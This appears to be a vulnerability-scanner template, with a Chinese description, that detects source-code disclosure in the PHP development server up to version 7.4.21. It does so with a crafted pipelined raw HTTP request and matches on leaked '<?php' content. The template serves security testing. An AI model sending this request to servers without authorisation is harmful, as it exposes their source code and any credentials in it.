id: php-src-diclosure

info:
  name: PHP Development 服务器 <= 7.4.21 Remote Source 泄露
  author: pdteam
  severity: high
  description: |
    检测到 PHP Development 服务器 <= 7.4.21 Remote Source 泄露。目标响应或文件中可能暴露配置、凭据、密钥、令牌、环境变量或历史记录等敏感信息，可能被用于进一步入侵。
  reference:
    - https://blog.projectdiscovery.io/php-http-server-source-disclosure/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-540
  metadata:
    max-request: 2
  tags: php,phpcli,diclosure,misconfig,vuln

http:
  - raw:
      - |+
        GET /  HTTP/1.1
        Host: {{Hostname}}

        GET /{{rand_base(3)}}.{{rand_base(2)}} HTTP/1.1





      - |+
        GET /  HTTP/1.1
        Host: {{Hostname}}

    unsafe: true
    matchers:
      - type: dsl
        dsl:
          - 'contains(body_1, "<?php")'
          - '!contains(body_2, "<?php")'
        condition: and
